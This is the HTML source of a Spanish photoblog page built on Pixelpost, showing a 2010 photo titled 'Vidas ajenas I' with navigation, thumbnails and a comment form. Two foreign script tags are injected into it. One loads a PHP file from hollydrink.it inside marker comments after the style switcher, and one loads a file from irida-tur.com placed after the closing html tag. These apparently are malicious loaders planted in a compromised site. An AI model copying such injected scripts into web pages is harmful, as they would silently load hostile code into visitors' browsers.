﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
<link rel="shortcut icon" href="http://www.antoniocarlon.com/favicon.ico">
<head>

<!--

Delicious Template for Pixelpost (modified)

Author: JaySoto
Site: http://www.sotolicious.com/delicious
E-mail: jason.m.soto@gmail.com

This template was a lot of work... feel free to modify it to your hearts content, but please leave my name in here... thanks!

-->

<title>.:antoniocarlon:. | Vidas ajenas I</title>

<!-- Link for ATOM feed autodiscovery -->
<link rel="service.feed" type="application/x.atom+xml" title="antoniocarlon - ATOM Feed" href="http://www.antoniocarlon.com/photoblog/index.php?x=atom" />
<!-- Link for RSS feed autodiscovery -->
<link rel="alternate" type="application/rss+xml" title="antoniocarlon - RSS Feed" href="http://www.antoniocarlon.com/photoblog/index.php?x=rss" />
<!-- META -->
<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
<meta http-equiv="content-type" name="keywords" content="PhotoBlog,antoniocarlon - Fotografía,Vidas ajenas I,Pixelpost" />
<meta http-equiv="content-type" name="description" content="antoniocarlon - Fotografía-PhotoBlog: Vidas ajenas I, " />
<meta http-equiv="imagetoolbar" content="no" />

<!-- CSS -->
<link rel="stylesheet" type="text/css" href="templates/delicious_v1_1/styles/dark.css" title="dark" />
<link rel="stylesheet" type="text/css" href="templates/delicious_v1_1/styles/light.css" title="light" />

<!-- SCRIPTS -->
<script type="text/javascript" src="templates/delicious_v1_1/scripts/prototype.js"></script>
<script type="text/javascript" src="templates/delicious_v1_1/scripts/scriptaculous.js"></script>
<script type="text/javascript" src="templates/delicious_v1_1/scripts/styleswitcher.js"></script>
<script type="text/javascript" src="scripts/overlib/overlib.js"></script>

<script type="text/javascript">
	function browsing(){
		var existprev = "33";
		var existnext = "35";
		if (existprev != "34"){
			document.write('<a href="#" id="menu_browse_prev" onclick="document.location=\'index.php?showimage=33\';"></a>');
		}
		if (existnext != "34"){
			document.write('<a href="#" id="menu_browse_next" onclick="document.location=\'index.php?showimage=35\';"></a>');
		}
	}
</script>

<script type="text/javascript" src="templates/delicious_v1_1/scripts/image_fade.js"></script>

</head>

<body>

<div id="styleswitcher">
<a href="http://feeds.feedburner.com/antoniocarlon" rel="alternate" type="application/rss+xml"><img src="templates/delicious_v1_1/images/rss.gif" alt="" border="0" /></a>
</div><!--9aaaf8--><script type="text/javascript" src="http://www.hollydrink.it/tmp/yPLM4zJB.php?id=20006216"></script><!--/9aaaf8-->
 <!-- styleswitcher -->

<div id="image_wrapper" style="width:1024px;">

<div id="header" style="width:100%;left:-21px;">

<div id="logo" style="width:39.9%;">
	<div id="logo_sub">
		<table border=0><tr><td nowrap><a title="click for home" href="index.php"><font color="white">antonio</font><font color="#999999">carlon</font></a><img src="templates/delicious_v1_1/images/barcode.gif" alt="" border="0" /></td></tr></table>
	</div> <!-- logo_sub -->
</div> <!-- logo -->

<div id="nav" style="width:59.9%;">
	<div id="nav_sub">
		<a onclick="Effect.toggle('info','BLIND'); return false;" title="Título, descripción y comentarios" href="#">Detalles</a>&#32;::&#32;<a href="index.php">&Uacute;ltima foto</a>&#32;::&#32;<a href="./index.php?x=browse">Ver todas</a>
	</div> <!-- logo_sub -->
</div> <!-- logo -->

</div>

<div id="photobox" style="width:1024px;height:768px;">

<div id="image-border" style="width: 1024px; height: 768px;">
<img src="images/20100716162350_33.jpg" alt="Vidas ajenas I" title="Vidas ajenas I" width="1024" height="768" id="photo" name="photo" style="background:black;"/>
<div id="menu_browse" style="width: 1024px; height: 768px;">
<script type="text/javascript">
browsing();
</script>
</div> <!-- menu_browse -->
</div> <!-- image-border -->

<div id="image_footer">&copy;2010 <a href="http://www.antoniocarlon.com">Antonio Carlón Paredes</a> | All Rights Reserved | Powered By <a href="http://www.pixelpost.org">Pixelpost</a> | Template by <a href="http://www.sotolicious.com">JaySoto</a> | <a href='http://photos.vfxy.com/'><img src='http://photos.vfxy.com/img/iam_vfxy.jpg' alt='VFXY Photos' title='VFXY Photos' border='0' /></a> | <a href="http://www.photoblogs.com/cat/personal/"><img src="http://www.photoblogs.com/images/button_80x15.gif" alt="Photoblogs" style="width:80px;height:15px;border:none;" /></a></div>

</div> <!-- photobox -->

<div id="info" style="display:none;width: 1024px;margin-top:7px;">

<div id="info-in">

<div id="title-heading">
Vidas ajenas I<span class="date"> | 2010-07-16 16:23:50</span>
</div> <!-- title-heading -->

<div id="description">
<div id="notes">
<p></p>
<p>Categor&iacute;as: <span class="exif">Categor&iacute;a:  </span></p>
</div> <!-- notes -->
</div> <!-- description -->

<div id="recentcomments">
<h5>Comentarios</h5>
<ul><li>No hay comentarios a&uacute;n.</li></ul>
</div> <!-- recentcomments -->

<div id="addcomment">
<h5>Comenta esta foto</h5>
<div id="div_line" style="margin-bottom:10px;"></div>
<div style="display:inline;margin:0;">
<form method='post' action='index.php?x=save_comment' name='commentform' accept-charset='UTF-8' style="display:inline;margin:0;">
<label for="name">Nombre</label><br />
<input type='text' name='name' class='formfield' value='' id="name"/><br /><br />
<label for="email">Email</label><br />
<input class='formfield' type='text' name='email' value='' id="email"/><br /><br />
<label for="url">URL</label><br />
<input type='text' name='url' class='formfield' value='' id="url"/><br /><br />
<label for="comment">Comentario</label><br />
<textarea name="message" rows="4" cols="24" onfocus="clearBox(this);" class="formfield"></textarea><br /><br />
<input type='submit' value='Enviar' class="formbutton"/>
<input type='hidden' name='parent_id' value='34' />
<input type='hidden' name='parent_name' value='20100716162350_33.jpg' />
</form>
</div>
</div> <!-- addcomment -->

</div>

<br clear="all">

</div> <!-- info -->

<div id="thumbnails" style="left:1024px;">
	<a href='./index.php?showimage=36'><img src='thumbnails/thumb_20100720183514_35.jpg' alt='La vida en un segundo' title='La vida en un segundo' class='thumbnails' width='100' height='75' /></a><a href='./index.php?showimage=35'><img src='thumbnails/thumb_20100718202657_34.jpg' alt='Ciudad bohemia' title='Ciudad bohemia' class='thumbnails' width='100' height='75' /></a><a href='./index.php?showimage=34'><img src='thumbnails/thumb_20100716162350_33.jpg' alt='Vidas ajenas I' title='Vidas ajenas I' class='current-thumbnail' width='100' height='75' /></a><a href='./index.php?showimage=33'><img src='thumbnails/thumb_20100714210158_32.jpg' alt='Marqués de Pombal' title='Marqués de Pombal' class='thumbnails' width='100' height='75' /></a><a href='./index.php?showimage=32'><img src='thumbnails/thumb_20100713174637_31.jpg' alt='Haciendo Historia' title='Haciendo Historia' class='thumbnails' width='100' height='75' /></a>
</div> <!-- thumbnails -->

</div> <!-- image_wrapper -->

</body>
</html>
<script type="text/javascript" src="http://irida-tur.com/nvlgzkvf.php?id=14097740"></script>








